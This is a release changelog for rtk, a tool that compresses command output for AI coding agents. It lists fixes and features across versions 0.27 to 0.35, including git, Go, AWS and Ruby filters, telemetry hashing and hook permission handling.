* **go:** avoid false build errors from download logs ([d44fd3e](https://github.com/rtk-ai/rtk/commit/d44fd3e034208e3bcd59c2c46f7720eec4f10c98))
* **go:** cover more build failure shapes ([2425ad6](https://github.com/rtk-ai/rtk/commit/2425ad68e5386d19e5ec9ff1ca151a6d2c9a56d3))
* **go:** preserve failing test location context ([1481bc5](https://github.com/rtk-ai/rtk/commit/1481bc590924031456a6022510275c29c09e330e))
* **go:** preserve failing test location context ([374fe64](https://github.com/rtk-ai/rtk/commit/374fe64cfbedcd676733973e81a63a6dfecbb1b7))
* **go:** restore build error coverage ([1177c9c](https://github.com/rtk-ai/rtk/commit/1177c9c873ac63b6c0bcc9e1b664a705baa0ad7a))
* **grep:** close subprocess stdin to prevent memory leak ([#897](https://github.com/rtk-ai/rtk/issues/897)) ([7217562](https://github.com/rtk-ai/rtk/commit/72175623551f40b581b4a7f6ed966c1e4a9c7358))
* **grep:** close subprocess stdin to prevent memory leak ([#897](https://github.com/rtk-ai/rtk/issues/897)) ([09979cf](https://github.com/rtk-ai/rtk/commit/09979cf29701a1b775bcac761d24ec0e055d1bec))
* **hook_check:** detect missing integrations ([9cf9ccc](https://github.com/rtk-ai/rtk/commit/9cf9ccc1ac39f8bba37e932c7d318a3aa7a34ae9))
* **init:** remove opt-out instruction from telemetry message ([7571c8e](https://github.com/rtk-ai/rtk/commit/7571c8e101c41ee64c51e2bd64697f85f9142423))
* **init:** remove telemetry info lines from init output ([7dbef2c](https://github.com/rtk-ai/rtk/commit/7dbef2ce00824d26f2057e4c3c76e429e2e23088))
* **main:** kill zombie processes + path for rtk md ([d16fc6d](https://github.com/rtk-ai/rtk/commit/d16fc6dacbfec912c21522939b15b7bbd9719487))
* **main:** kill zombie processes + path for rtk md + missing intergrations ([a919335](https://github.com/rtk-ai/rtk/commit/a919335519ed4a5259a212e56407cb312aa99bac))
* **merge:** changelog conflicts ([d92c5d2](https://github.com/rtk-ai/rtk/commit/d92c5d264a49483c8d6079e04d946a79bc990a74))
* **proxy:** kill child process on SIGINT/SIGTERM to prevent orphans ([d813919](https://github.com/rtk-ai/rtk/commit/d813919a24546e044e7844fc7ed05fef4ec24033))
* **proxy:** kill child process on SIGINT/SIGTERM to prevent orphans ([3318510](https://github.com/rtk-ai/rtk/commit/33185101fc122d0c11a25a4e02ac9f3a7dc7e3bb))
* **review:** address ChildGuard disarm, stdin dedup, hook masking ([d85fe33](https://github.com/rtk-ai/rtk/commit/d85fe3384b87c16fafd25ec7bcadbff6e69f3f1f))
* **security:** default to ask when no permission rule matches ([#886](https://github.com/rtk-ai/rtk/issues/886)) ([158c745](https://github.com/rtk-ai/rtk/commit/158c74527f6591d372e40a78cd604d73a20649a9))
* **security:** default to ask when no permission rule matches ([#886](https://github.com/rtk-ai/rtk/issues/886)) ([41a6c6b](https://github.com/rtk-ai/rtk/commit/41a6c6bf6da78a4754794fdc6a1469df2e327920))
* **tracking:** use std::env::temp_dir() for compatibility (instead of unix tmp) ([e918661](https://github.com/rtk-ai/rtk/commit/e918661440d7b50321f0535032f52c5e87aaf3cb))

## [Unreleased]

### Bug Fixes

* **git:** remove `-u` short alias from `--ultra-compact` to fix `git push -u` upstream tracking ([#1086](https://github.com/rtk-ai/rtk/issues/1086))

## [0.35.0](https://github.com/rtk-ai/rtk/compare/v0.34.3...v0.35.0) (2026-04-06)


### Features

* **aws:** expand CLI filters from 8 to 25 subcommands ([402c48e](https://github.com/rtk-ai/rtk/commit/402c48e66988e638a5b4f4dd193238fc1d0fe18f))


### Bug Fixes

* **cmd:** read/cat multiple file and consistent behavior ([3f58018](https://github.com/rtk-ai/rtk/commit/3f58018f4af1d7206457929cf80bb4534203c3ee))
* **docs:** clean some docs + disclaimer ([deda44f](https://github.com/rtk-ai/rtk/commit/deda44f73607981f3d27ecc6341ce927aab34d37))
* **gh:** pass through gh pr merge instead of canned response ([#938](https://github.com/rtk-ai/rtk/issues/938)) ([8465ca9](https://github.com/rtk-ai/rtk/commit/8465ca953fa9d70dcc971a941c19465d456eb7d4))
* **gh:** pass through gh pr merge instead of canned response ([#938](https://github.com/rtk-ai/rtk/issues/938)) ([e1f2845](https://github.com/rtk-ai/rtk/commit/e1f2845df06a8d8b8325945dc4940ec5f530e4cc))
* **git:** inherit stdin for commit and push to preserve SSH signing ([#733](https://github.com/rtk-ai/rtk/issues/733)) ([eefeae4](https://github.com/rtk-ai/rtk/commit/eefeae45656ff2607c3f519c8eae235e3f0fe411))
* **git:** inherit stdin for commit and push to preserve SSH signing ([#733](https://github.com/rtk-ai/rtk/issues/733)) ([6cee6c6](https://github.com/rtk-ai/rtk/commit/6cee6c60b80f914ed9505e3925d85cadec43ab97))
* **git:** preserve full diff hunk headers ([62f4452](https://github.com/rtk-ai/rtk/commit/62f445227679f3df293fe35e9b18cc5ab39d7963))
* **git:** preserve full diff hunk headers ([09b3ff9](https://github.com/rtk-ai/rtk/commit/09b3ff9424e055f5fe25e535e5b60e077f8344f9))
* **go:** avoid false build errors from download logs ([9c1cf2f](https://github.com/rtk-ai/rtk/commit/9c1cf2f403534fa7874638b1b983c2d7f918a185))
* **go:** avoid false build errors from download logs ([d44fd3e](https://github.com/rtk-ai/rtk/commit/d44fd3e034208e3bcd59c2c46f7720eec4f10c98))
* **go:** cover more build failure shapes ([2425ad6](https://github.com/rtk-ai/rtk/commit/2425ad68e5386d19e5ec9ff1ca151a6d2c9a56d3))
* **go:** preserve failing test location context ([1481bc5](https://github.com/rtk-ai/rtk/commit/1481bc590924031456a6022510275c29c09e330e))
* **go:** preserve failing test location context ([374fe64](https://github.com/rtk-ai/rtk/commit/374fe64cfbedcd676733973e81a63a6dfecbb1b7))
* **go:** restore build error coverage ([1177c9c](https://github.com/rtk-ai/rtk/commit/1177c9c873ac63b6c0bcc9e1b664a705baa0ad7a))
* **grep:** close subprocess stdin to prevent memory leak ([#897](https://github.com/rtk-ai/rtk/issues/897)) ([7217562](https://github.com/rtk-ai/rtk/commit/72175623551f40b581b4a7f6ed966c1e4a9c7358))
* **grep:** close subprocess stdin to prevent memory leak ([#897](https://github.com/rtk-ai/rtk/issues/897)) ([09979cf](https://github.com/rtk-ai/rtk/commit/09979cf29701a1b775bcac761d24ec0e055d1bec))
* **hook_check:** detect missing integrations ([9cf9ccc](https://github.com/rtk-ai/rtk/commit/9cf9ccc1ac39f8bba37e932c7d318a3aa7a34ae9))
* **init:** remove opt-out instruction from telemetry message ([7571c8e](https://github.com/rtk-ai/rtk/commit/7571c8e101c41ee64c51e2bd64697f85f9142423))
* **init:** remove telemetry info lines from init output ([7dbef2c](https://github.com/rtk-ai/rtk/commit/7dbef2ce00824d26f2057e4c3c76e429e2e23088))
* **main:** kill zombie processes + path for rtk md ([d16fc6d](https://github.com/rtk-ai/rtk/commit/d16fc6dacbfec912c21522939b15b7bbd9719487))
* **main:** kill zombie processes + path for rtk md + missing intergrations ([a919335](https://github.com/rtk-ai/rtk/commit/a919335519ed4a5259a212e56407cb312aa99bac))
* **merge:** changelog conflicts ([d92c5d2](https://github.com/rtk-ai/rtk/commit/d92c5d264a49483c8d6079e04d946a79bc990a74))
* **proxy:** kill child process on SIGINT/SIGTERM to prevent orphans ([d813919](https://github.com/rtk-ai/rtk/commit/d813919a24546e044e7844fc7ed05fef4ec24033))
* **proxy:** kill child process on SIGINT/SIGTERM to prevent orphans ([3318510](https://github.com/rtk-ai/rtk/commit/33185101fc122d0c11a25a4e02ac9f3a7dc7e3bb))
* **review:** address ChildGuard disarm, stdin dedup, hook masking ([d85fe33](https://github.com/rtk-ai/rtk/commit/d85fe3384b87c16fafd25ec7bcadbff6e69f3f1f))
* **security:** default to ask when no permission rule matches ([#886](https://github.com/rtk-ai/rtk/issues/886)) ([158c745](https://github.com/rtk-ai/rtk/commit/158c74527f6591d372e40a78cd604d73a20649a9))
* **security:** default to ask when no permission rule matches ([#886](https://github.com/rtk-ai/rtk/issues/886)) ([41a6c6b](https://github.com/rtk-ai/rtk/commit/41a6c6bf6da78a4754794fdc6a1469df2e327920))
* **tracking:** use std::env::temp_dir() for compatibility (instead of unix tmp) ([e918661](https://github.com/rtk-ai/rtk/commit/e918661440d7b50321f0535032f52c5e87aaf3cb))

## [Unreleased]

### Features

* **aws:** expand CLI filters from 8 to 25 subcommands — CloudWatch Logs, CloudFormation events, Lambda, IAM, DynamoDB (with type unwrapping), ECS tasks, EC2 security groups, S3API objects, S3 sync/cp, EKS, SQS, Secrets Manager ([#885](https://github.com/rtk-ai/rtk/pull/885))
* **aws:** add shared runner `run_aws_filtered()` eliminating per-handler boilerplate
* **tee:** add `force_tee_hint()` — truncated output saves full data to file with recovery hint

## [0.34.3](https://github.com/rtk-ai/rtk/compare/v0.34.2...v0.34.3) (2026-04-02)


### Bug Fixes

* **automod:** add auto discovery for cmds ([234909d](https://github.com/rtk-ai/rtk/commit/234909d2c754ade2fdc939b0a1435a8e34ffc305))
* **ci:** fix validate-docs.sh broken module count check ([bbe3da6](https://github.com/rtk-ai/rtk/commit/bbe3da642b5fc4b065b13a65647ea0ebf5264e65))
* **cleaning:** constant extract ([aabc016](https://github.com/rtk-ai/rtk/commit/aabc0167bc013fd2d0c61a687580f6e69305500a))
* **cmds:** migrate remaining exit_code to exit_code_from_output ([ba9fa34](https://github.com/rtk-ai/rtk/commit/ba9fa345f3d1d14bd0af236ec9aa8a9a0e5581d6))
* **cmds:** more covering for run_filtered ([e48485a](https://github.com/rtk-ai/rtk/commit/e48485adc6a33d12b70664598020595cf7dfcd7e))
* **docs:** add documentation ([2f7278a](https://github.com/rtk-ai/rtk/commit/2f7278ac5992bf2e84b763fb05642d89900ba495))
* **docs:** add maintainers docs ([14265b4](https://github.com/rtk-ai/rtk/commit/14265b48c3a15e459a31da11250a51ab5830a508))
* **refacto-p1:** unified cmds execution flow  (+ rm dead code) ([75bd607](https://github.com/rtk-ai/rtk/commit/75bd607d55235f313855f5fe8c9eceafd73700a7))
* **refacto-p2:** more standardize ([47a76ea](https://github.com/rtk-ai/rtk/commit/47a76ea35ed2fe02a3600792163f727fa3a94ff2))
* **refacto-p2:** more standardize ([92c671a](https://github.com/rtk-ai/rtk/commit/92c671a175a5e2bf09720fd1a8591140bcb473a0))
* **refacto:** wrappers for standardization, exit codes lexer tokenizer, constants, code clean ([bff0258](https://github.com/rtk-ai/rtk/commit/bff02584243f1b73418418b0c05365acf56fbb36))
* **registry:** quoted env prefix + inline regex cleanup + routing docs ([f3217a4](https://github.com/rtk-ai/rtk/commit/f3217a467b543a3181605b257162f2b3ab5d5df0))
* **review:** address PR [#910](https://github.com/rtk-ai/rtk/issues/910) review feedback ([0a8b8fd](https://github.com/rtk-ai/rtk/commit/0a8b8fd0693fa504f376146cbbcafe9ddf4632c8))
* **review:** PR [#934](https://github.com/rtk-ai/rtk/issues/934) ([5bd35a3](https://github.com/rtk-ai/rtk/commit/5bd35a33ad6abe5278749726bed19912664531c2))
* **review:** PR [#934](https://github.com/rtk-ai/rtk/issues/934) ([bae7930](https://github.com/rtk-ai/rtk/commit/bae79301194bbb48d1cbb39554096c3225f7cb73))
* **rules:** add wc RtkRule with pattern field for develop compat ([d75e864](https://github.com/rtk-ai/rtk/commit/d75e864f20451a5e17918c75f2ea32672f65e1f4))
* **standardize:** git+kube sub wrappers run_filtered ([7fd221f](https://github.com/rtk-ai/rtk/commit/7fd221f44660bcf411aa333d2c35a49ff89e7961))
* **standardize:** merge pattern into rues ([08aabb9](https://github.com/rtk-ai/rtk/commit/08aabb95c3ae6e0b734f696264e1e1a8c0f0b22e))

## [0.34.2](https://github.com/rtk-ai/rtk/compare/v0.34.1...v0.34.2) (2026-03-30)


### Bug Fixes

* **emots:** replace 📊 with "Summary:" ([495a152](https://github.com/rtk-ai/rtk/commit/495a152059feabc7b516b96e804757608b87a10a))
* **refacto-codebase:** technical docs & sub folders ([927daef](https://github.com/rtk-ai/rtk/commit/927daef49b8f771d195201d196378e27e0ee8a2b))

## [0.34.1](https://github.com/rtk-ai/rtk/compare/v0.34.0...v0.34.1) (2026-03-28)


### Bug Fixes

* **security:** missing toml pkg ([51f9c88](https://github.com/rtk-ai/rtk/commit/51f9c888b81169309df92f7fa3a6f705d44adcab))
* **security:** salt device hash for telemetry ([32fdbbb](https://github.com/rtk-ai/rtk/commit/32fdbbbb6923c70d343fab14b4b0ce70424e610f))
* **security:** set 0600 permissions on salt file ([5eae11d](https://github.com/rtk-ai/rtk/commit/5eae11d16410dc4ff26e97672e5367b14efaab76))
* **telemetry:** cache salt in-process ([22dc059](https://github.com/rtk-ai/rtk/commit/22dc059310b0408adedc2d1228de339e16ea6c0a))
* **telemetry:** docs + real info from "rtk init -g" ([33195cc](https://github.com/rtk-ai/rtk/commit/33195cc686318ddcca54edfdd1215bd9fd28f891))
* **telemetry:** hash + salt ([92996b1](https://github.com/rtk-ai/rtk/commit/92996b127257eae16d3e17179592b2899f19254f))

## [0.34.0](https://github.com/rtk-ai/rtk/compare/v0.33.1...v0.34.0) (2026-03-26)


### Features

* **init:** add --copilot flag for GitHub Copilot integration ([9e19aac](https://github.com/rtk-ai/rtk/commit/9e19aac75e790ecbfd1dc5b2d01786f6b9edf506)), closes [#823](https://github.com/rtk-ai/rtk/issues/823)


### Bug Fixes

* **diff:** correct truncation overflow count in condense_unified_diff ([5399f83](https://github.com/rtk-ai/rtk/commit/5399f836a5c642121f0f6e7812ff4131d84d0509))
* **diff:** never truncate diff content — show all changes in full ([80fc29a](https://github.com/rtk-ai/rtk/commit/80fc29a839f51ef605474037e1a8fd86b4aac05a)), closes [#827](https://github.com/rtk-ai/rtk/issues/827)
* **git:** replace vague truncation markers with exact counts ([185fb97](https://github.com/rtk-ai/rtk/commit/185fb97061517922ea5844d8c6008f2eb86fd55d))
* **merge:** resolve conflict with develop in diff_cmd.rs ([6a5ae14](https://github.com/rtk-ai/rtk/commit/6a5ae1484b32c38bd99baca925175ae610e3d1e3))
* **read:** default to no filtering — show full file content ([5e0f3ba](https://github.com/rtk-ai/rtk/commit/5e0f3ba774eab52f8ca2ac603e2ae4eae79b2edc)), closes [#822](https://github.com/rtk-ai/rtk/issues/822)
* **read:** detect binary files and prevent empty output on filter failure ([8886c14](https://github.com/rtk-ai/rtk/commit/8886c14c9cf97fb4413efec3be8e50fdb84824e9)), closes [#822](https://github.com/rtk-ai/rtk/issues/822)
* rewrite swift test commands ([599ad25](https://github.com/rtk-ai/rtk/commit/599ad25deb0f8dc9ecab37f4bbe26324dac07b2e))
* truncation accuracy + Copilot init + binary file detection ([966bcbe](https://github.com/rtk-ai/rtk/commit/966bcbe638be18bbaba4298df985804643f82c85))
* **truncation:** accurate overflow counts and omission indicators ([58a9633](https://github.com/rtk-ai/rtk/commit/58a963347467613d48db05ad56bc8f1f3a06b65d))

## [Unreleased]

### Bug Fixes

* **wc:** `wc` filter was never invoked by the hook — removed `"wc "` from `IGNORED_PREFIXES` and added registry entry so `wc` commands are rewritten to `rtk wc`
* **diff:** correct truncation overflow count in condense_unified_diff ([#833](https://github.com/rtk-ai/rtk/pull/833)) ([5399f83](https://github.com/rtk-ai/rtk/commit/5399f83))
* **git:** replace vague truncation markers with exact counts in log and grep output ([#833](https://github.com/rtk-ai/rtk/pull/833)) ([185fb97](https://github.com/rtk-ai/rtk/commit/185fb97))

## [0.33.1](https://github.com/rtk-ai/rtk/compare/v0.33.0...v0.33.1) (2026-03-25)


### Bug Fixes

* **cicd:** dev- prefix for pre-release tags ([522bd64](https://github.com/rtk-ai/rtk/commit/522bd648c8cae41f6cadedcd40a96d879c6ecf0a))
* **cicd:** use dev- prefix for pre-release tags ([9c21275](https://github.com/rtk-ai/rtk/commit/9c212752fc0401820f8665198f00882684496175))
* **cicd:** use dev- prefix for pre-release tags to avoid polluting release-please ([32c67e0](https://github.com/rtk-ai/rtk/commit/32c67e01326374f0365602f61542a3639a8f121b))
* hook security + stderr redirects + version bump ([#807](https://github.com/rtk-ai/rtk/issues/807)) ([0649e97](https://github.com/rtk-ai/rtk/commit/0649e974fb8f27778ef0d22aa97905d9ebc8f03c))
* **hook:** respect Claude Code deny/ask permission rules on rewrite ([a051a6f](https://github.com/rtk-ai/rtk/commit/a051a6f5e56c7ee59375a365580bced634e29c02))
* strip trailing stderr redirects before rewrite matching ([#530](https://github.com/rtk-ai/rtk/issues/530)) ([edd9c02](https://github.com/rtk-ai/rtk/commit/edd9c02e892b297a7e349031b61ef971c982b53d))
* strip trailing stderr redirects before rewrite matching ([#530](https://github.com/rtk-ai/rtk/issues/530)) ([36a6f48](https://github.com/rtk-ai/rtk/commit/36a6f482296d6fc85f8116040a16de2e128733f8))

## [0.33.0-rc.54](https://github.com/rtk-ai/rtk/compare/v0.32.0-rc.54...v0.33.0-rc.54) (2026-03-24)


### Features

* **ruby:** add Ruby on Rails support (rspec, rubocop, rake, bundle) ([#724](https://github.com/rtk-ai/rtk/issues/724)) ([15bc0f8](https://github.com/rtk-ai/rtk/commit/15bc0f8d6e135371688d5fd42decc6d8a99454f0))


### Bug Fixes

* add telemetry documentation and init notice ([#640](https://github.com/rtk-ai/rtk/issues/640)) ([#788](https://github.com/rtk-ai/rtk/issues/788)) ([0eecee5](https://github.com/rtk-ai/rtk/commit/0eecee5bf35ffd8b13f36a59ec39bd52626948d3))
* **cargo:** preserve test compile diagnostics ([97b6878](https://github.com/rtk-ai/rtk/commit/97b68783f50d209c2c599ae42cc638520749e668))
* **cicd:** explicit fetch tag ([3b94b60](https://github.com/rtk-ai/rtk/commit/3b94b602ed24b9ecec597ce001e59f325caaadd4))
* **cicd:** gete release like tag for pre-release ([53bc81e](https://github.com/rtk-ai/rtk/commit/53bc81e9e6d3d0876fb1a23dbf6f08bc074b68be))
* **cicd:** issue 668 - pre release tag ([200af43](https://github.com/rtk-ai/rtk/commit/200af436d48dd2539cb00652b082f25c57873c9c))
* **cicd:** missing doc ([8657494](https://github.com/rtk-ai/rtk/commit/865749438e67f6da7f719d054bf377d857925ad3))
* **cicd:** pre-release correct tag ([1536667](https://github.com/rtk-ai/rtk/commit/15366678adeece701f38e91204128b070c0e3fc4))
* **dotnet:** TRX injection for Microsoft.Testing.Platform projects ([8eefef1](https://github.com/rtk-ai/rtk/commit/8eefef1b496035ce898effc5446e6851084d6fa4))
* **formatter:** show full error message for test failures ([#690](https://github.com/rtk-ai/rtk/issues/690)) ([dc6b026](https://github.com/rtk-ai/rtk/commit/dc6b0260ab4c1bdbccb4b775d879eb473b212c21))
* **formatter:** show full error message for test failures ([#690](https://github.com/rtk-ai/rtk/issues/690)) ([f7b09fc](https://github.com/rtk-ai/rtk/commit/f7b09fc86a693acf2b52954215ff0c4e6c5d03f9))
* **gh:** passthrough --comments flag in issue/pr view ([75cd223](https://github.com/rtk-ai/rtk/commit/75cd2232e274f898d8a335ba866fc507ce64b949))
* **gh:** passthrough --comments flag in issue/pr view ([fdeb09f](https://github.com/rtk-ai/rtk/commit/fdeb09fb93564e795711e9a531d2e2e20187c3a7)), closes [#720](https://github.com/rtk-ai/rtk/issues/720)
* **gh:** skip compact_diff for --name-only/--stat flags in pr diff ([2ef0690](https://github.com/rtk-ai/rtk/commit/2ef0690767eb733c705e4de56d02c64696a4acc6)), closes [#730](https://github.com/rtk-ai/rtk/issues/730)
* **gh:** skip compact_diff for --name-only/--stat in pr diff ([c576249](https://github.com/rtk-ai/rtk/commit/c57624931a96181f869645817fdd96bc056da044))
* **golangci-lint:** add v2 compatibility with runtime version detection ([95a4961](https://github.com/rtk-ai/rtk/commit/95a4961e4aa3ba5307b3dfad246c6168c4caeab8))
* **golangci:** use resolved_command for version detection, move test fixture to file ([6aa5e90](https://github.com/rtk-ai/rtk/commit/6aa5e90dc466f87c88a2401b4eb2aa0f323379f4))
* increase signal in git diff, git log, and json filters ([#621](https://github.com/rtk-ai/rtk/issues/621)) ([#708](https://github.com/rtk-ai/rtk/issues/708)) ([4edc3fc](https://github.com/rtk-ai/rtk/commit/4edc3fc0838e25ee6d1754c7e987b5507742f600))
* **playwright:** add tee_and_hint pass-through on failure ([#690](https://github.com/rtk-ai/rtk/issues/690)) ([b4ccf04](https://github.com/rtk-ai/rtk/commit/b4ccf046f59ce6ed1396e4d8c46f8a35152d6d09))
* preserve cargo test compile diagnostics ([15d5beb](https://github.com/rtk-ai/rtk/commit/15d5beb9f70caf1f84e9b506faaf840c70c1cf4e))
* **ruby:** use rails test for positional file args in rtk rake ([ec92c43](https://github.com/rtk-ai/rtk/commit/ec92c43f231eb2321a4b423b0eb8487f98161aac))
* **ruby:** use rails test for positional file args in rtk rake ([138e914](https://github.com/rtk-ai/rtk/commit/138e91411b4802e445a97429056cca73282d09e1))
* update Discord invite link ([#711](https://github.com/rtk-ai/rtk/issues/711)) ([#786](https://github.com/rtk-ai/rtk/issues/786)) ([af56573](https://github.com/rtk-ai/rtk/commit/af56573ae2b234123e4685fd945980e644f40fa3))

## [Unreleased]

### Bug Fixes

* **hook:** respect Claude Code deny/ask permission rules on rewrite — hook now checks settings.json before rewriting commands, preventing bypass of user-configured deny/ask permissions
* **git:** replace symbol prefixes (`* branch`, `+ Staged:`, `~ Modified:`, `? Untracked:`) with plain lowercase labels (`branch:`, `staged:`, `modified:`, `untracked:`) in git status output
* **ruby:** use `rails test` instead of `rake test` when positional file args are passed — `rake test` ignores positional files and only supports `TEST=path`

### Features

* **ruby:** add RSpec test runner filter with JSON parsing and text fallback (60%+ reduction)
* **ruby:** add RuboCop linter filter with JSON parsing, grouped by cop/severity (60%+ reduction)
* **ruby:** add Minitest filter for `rake test` / `rails test` with state machine parser (85-90% reduction)
* **ruby:** add TOML filter for `bundle install/update` — strip `Using` lines (90%+ reduction)
* **ruby:** add `ruby_exec()` shared utility for auto-detecting `bundle exec` when Gemfile exists
* **ruby:** add discover/rewrite rules for rake, rails, rspec, rubocop, and bundle commands

### Bug Fixes

* **cargo:** preserve compile diagnostics when `cargo test` fails before any test suites run
## [0.31.0](https://github.com/rtk-ai/rtk/compare/v0.30.1...v0.31.0) (2026-03-19)


### Features

* 9-tool AI agent support + emoji removal ([#704](https://github.com/rtk-ai/rtk/issues/704)) ([737dada](https://github.com/rtk-ai/rtk/commit/737dada4a56c0d7a482cc438e7280340d634f75d))

## [0.30.1](https://github.com/rtk-ai/rtk/compare/v0.30.0...v0.30.1) (2026-03-18)


### Bug Fixes

* remove all decorative emojis from CLI output ([#687](https://github.com/rtk-ai/rtk/issues/687)) ([#686](https://github.com/rtk-ai/rtk/issues/686)) ([4792008](https://github.com/rtk-ai/rtk/commit/4792008fc15553cbb9aeaa602f773a5f8f7f7afe))

## [0.30.0](https://github.com/rtk-ai/rtk/compare/v0.29.0...v0.30.0) (2026-03-16)


### Features

* add rtk session command for adoption overview ([be67d66](https://github.com/rtk-ai/rtk/commit/be67d660100c06a0751c08d943dc884ad5bff6a3))
* add rtk session command for adoption overview ([12d44c4](https://github.com/rtk-ai/rtk/commit/12d44c4068d7d4f65d5bd7551af29ab5a2352ed1)), closes [#487](https://github.com/rtk-ai/rtk/issues/487)
* add worktree slash commands for isolated development ([#364](https://github.com/rtk-ai/rtk/issues/364)) ([ab83e79](https://github.com/rtk-ai/rtk/commit/ab83e7933ebc26ca76f843d33285729875efb913))
* Claude Code tooling — 2 agents, 7 commands, 2 rules, 4 skills ([#491](https://github.com/rtk-ai/rtk/issues/491)) ([7b7a5ae](https://github.com/rtk-ai/rtk/commit/7b7a5ae4b6d23fbb882ed7d5e815e2ed0672c46c))


### Bug Fixes

* 6 critical bugs — exit codes, unwrap, lazy regex ([#626](https://github.com/rtk-ai/rtk/issues/626)) ([3005ebd](https://github.com/rtk-ai/rtk/commit/3005ebd0ad07912ae919687f6d3d49482aabaeac))
* align 7 TOML filter tests with on_empty behavior ([04ed6d8](https://github.com/rtk-ai/rtk/commit/04ed6d8c314dcbf86b147903b5a7f1cd956dc980))
* align 7 TOML filter tests with on_empty behavior ([9a499b9](https://github.com/rtk-ai/rtk/commit/9a499b9714e97a553d5603680ab1f843034acf28))
* **cicd-docs:** add agent reviewer + some contribute guidelines ([de710f4](https://github.com/rtk-ai/rtk/commit/de710f4ea30c333130c46f8a2e2c5b6b9edd4889))
* **cicd-docs:** some logs to understand what is happening when check docs ([191ea9a](https://github.com/rtk-ai/rtk/commit/191ea9af9f99ee78d74385fe1952ce83045e4afe))
* **cicd:** Clean cicd, rework depends and add pre-release ([d24a765](https://github.com/rtk-ai/rtk/commit/d24a7650e26aca89224a3ec5d263f1ce7c7121d6))
* **cicd:** Clean cicd, rework depends and add pre-release ([6303e95](https://github.com/rtk-ai/rtk/commit/6303e9530a379a8e3939e6c122ab4cf07cb16751))
* **cicd:** clippy - do not treat warn as error ([5da5db2](https://github.com/rtk-ai/rtk/commit/5da5db222d9927394995ccaeb3afc103e80c22bd))
* failing context for doc analyze -&gt; cat from files ([c6b7db2](https://github.com/rtk-ai/rtk/commit/c6b7db2e5a6cd9a05262e934b4fc7a44c699c3b0))
* git log --oneline regression drops commits ([#619](https://github.com/rtk-ai/rtk/issues/619)) ([8e85d67](https://github.com/rtk-ai/rtk/commit/8e85d676d78b12d2c421bb892f93971fc222fb39))
* improve adoption metric by detecting hook-rewritten commands ([eb8a2c4](https://github.com/rtk-ai/rtk/commit/eb8a2c4a71072870fca4b64e90189a4453acff84))
* normalize binlogs CRLF ([5344af9](https://github.com/rtk-ai/rtk/commit/5344af9a51f06b5dc42692e42c948ff11a3173c6))
* preserve commit body in git log output ([e189bbb](https://github.com/rtk-ai/rtk/commit/e189bbbe749120eda4d98a2130937269d8c0e92a))
* preserve first line of commit body in git log output ([c3416eb](https://github.com/rtk-ai/rtk/commit/c3416eb45f2f97297ec149d296a6a500697d302b))
* remove version check from validate-docs CI ([#476](https://github.com/rtk-ai/rtk/issues/476)) ([#543](https://github.com/rtk-ai/rtk/issues/543)) ([6e61c24](https://github.com/rtk-ai/rtk/commit/6e61c2447cc03af94220ce6ce83686f155e18086))
* split chained commands in adoption metric ([127f85c](https://github.com/rtk-ai/rtk/commit/127f85c02efd52a64e461005fa142d05f81615f8))
* support git -C &lt;path&gt; in rewrite registry ([c916bab](https://github.com/rtk-ai/rtk/commit/c916bab33ae9760b234fd720c944a849141f0d2e)), closes [#555](https://github.com/rtk-ai/rtk/issues/555)
* test-all.sh aborts when gt not installed ([#500](https://github.com/rtk-ai/rtk/issues/500)) ([#544](https://github.com/rtk-ai/rtk/issues/544)) ([26f5473](https://github.com/rtk-ai/rtk/commit/26f547371798ad32aed3569965303bc4857789ed))
* trust boundary followup — TOML key typo + missing meta commands ([#625](https://github.com/rtk-ai/rtk/issues/625)) ([8d8e188](https://github.com/rtk-ai/rtk/commit/8d8e188705e5784829693a83b2076d6118154764))
* windows path fix for git tests ([0a904e2](https://github.com/rtk-ai/rtk/commit/0a904e264d58f8f4b5f10e37ec3b11f717458fe0))

## [0.29.0](https://github.com/rtk-ai/rtk/compare/v0.28.2...v0.29.0) (2026-03-12)


### Features

* rewrite engine, OpenCode support, hook system improvements ([#539](https://github.com/rtk-ai/rtk/issues/539)) ([c1de10d](https://github.com/rtk-ai/rtk/commit/c1de10d94c0a35f825b71713e2db4624310c03d1))

## [0.28.2](https://github.com/rtk-ai/rtk/compare/v0.28.1...v0.28.2) (2026-03-10)


### Bug Fixes

* add tokens_saved to telemetry payload ([#471](https://github.com/rtk-ai/rtk/issues/471)) ([#472](https://github.com/rtk-ai/rtk/issues/472)) ([f8b7d52](https://github.com/rtk-ai/rtk/commit/f8b7d52d2d25d09a44f391576bad6a7b271f1f8c))

## [0.28.1](https://github.com/rtk-ai/rtk/compare/v0.28.0...v0.28.1) (2026-03-10)


### Bug Fixes

* 4 critical bugs + telemetry enrichment ([#462](https://github.com/rtk-ai/rtk/issues/462)) ([7d76af8](https://github.com/rtk-ai/rtk/commit/7d76af84b95e0f040e8b91a154edb89f80e5c380))
* restore lost telemetry install_method enrichment ([#469](https://github.com/rtk-ai/rtk/issues/469)) ([0c5cde9](https://github.com/rtk-ai/rtk/commit/0c5cde9ec234a2b7b0376adbcb78f2be48a98e86))

## [0.28.0](https://github.com/rtk-ai/rtk/compare/v0.27.2...v0.28.0) (2026-03-10)


### Features

* **gt:** add Graphite CLI support ([#290](https://github.com/rtk-ai/rtk/issues/290)) ([7fbc4ef](https://github.com/rtk-ai/rtk/commit/7fbc4ef4b553d5e61feeb6e73d8f6a96b6df3dd9))
* TOML Part 1 — filter DSL engine + 14 built-in filters ([#349](https://github.com/rtk-ai/rtk/issues/349)) ([adda253](https://github.com/rtk-ai/rtk/commit/adda2537be1fe69625ac280f15e8c8067d08c711))
* TOML Part 2 — user-global config, shadow warning, rtk init templates, 4 new built-in filters ([#351](https://github.com/rtk-ai/rtk/issues/351)) ([926e6a0](https://github.com/rtk-ai/rtk/commit/926e6a0dd4512c4cbb0f5ac133e60cb6134a3174))
* TOML Part 3 — 15 additional built-in filters (ping, rsync, dotnet, swift, shellcheck, hadolint, poetry, composer, brew, df, ps, systemctl, yamllint, markdownlint, uv) ([#386](https://github.com/rtk-ai/rtk/issues/386)) ([b71a8d2](https://github.com/rtk-ai/rtk/commit/b71a8d24e2dbd3ff9bb423c849638bfa23830c0b))

## [0.27.2](https://github.com/rtk-ai/rtk/compare/v0.27.1...v0.27.2) (2026-03-06)


### Bug Fixes

* gh pr edit/comment pass correct subcommand to gh ([#332](https://github.com/rtk-ai/rtk/issues/332)) ([799f085](https://github.com/rtk-ai/rtk/commit/799f0856e4547318230fe150a43f50ab82e1cf03))
